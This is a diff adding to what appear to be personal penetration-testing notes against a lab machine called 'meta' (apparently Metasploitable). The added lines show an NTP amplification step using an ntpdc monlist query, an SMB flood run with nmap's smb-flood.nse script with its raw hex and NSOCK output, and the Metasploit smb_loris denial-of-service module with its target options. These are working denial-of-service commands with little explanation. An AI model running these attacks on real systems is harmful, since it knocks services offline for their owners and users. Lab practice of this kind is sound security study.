@@ -200,7 +200,49 @@ msf auxiliary(smb_enumshares) > run
 [*] Auxiliary module execution completed
 msf auxiliary(smb_enumshares) >
 
+... ntp amplification attack
 
+... a vulnerable ntp server will list all connected devices(monlist)
+... we can attack the ntp server by following
+
+root@KaliLinux:~# ntpdc -c monlist meta
+remote address  port local address      count m ver rstr avgint
+
+... we can also use nse for the dos attack.
+
+┌─[✗]─[root@parrot]─[/usr/share/nmap/scripts]
+└──╼ # nmap --script smb-flood.nse -p445 meta
+
+Starting Nmap 7.60 ( https://nmap.org ) at 2018-07-12 23:51 EDT
+Stats: 0:00:38 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
+NSE Timing: About 0.00% done
+
+00000010: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 48 50               HP
+00000020: 00 00 01 00 11 00 00 03 32 00 01 00 04 41 00 00         2    A
+00000030: 00 00 01 00 21 56 00 00 fd e3 80 80 00 e0 37 8d     !V        7
+00000040: 42 1a d4 01 f0 00 3a 3a 00 6d 65 74 61 73 70 6c B     :: metaspl
+00000050: 6f 69 74 61 62 6c 65 00 00 60 28 06 06 2b 06 01 oitable  `(  +
+00000060: 05 05 02 a0 1e 30 1c a0 0e 30 0c 06 0a 2b 06 01      0   0   +
+00000070: 04 01 82 37 02 02 0a a3 0a 30 08 a0 06 1b 04 4e    7     0     N
+00000080: 4f 4e 45                                        ONE
+
+NSE: TCP 192.168.25.177:33808 > 192.168.25.141:445 | CLOSE
+NSOCK INFO [159.5110s] nsock_iod_delete(): nsock_iod_delete (IOD #159)
+NSOCK INFO [159.5120s] nsock_timer_create(): Timer created - 1000ms from now.  EID 5084
+
+... using metasploit
+
+msf auxiliary(smb_loris) >
+msf auxiliary(smb_loris) > show options
+
+Module options (auxiliary/dos/smb/smb_loris):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   RHOST  meta             yes       The target address
+   RPORT  445              yes       The target port (TCP)
+
+msf auxiliary(smb_loris) >
 
 
 
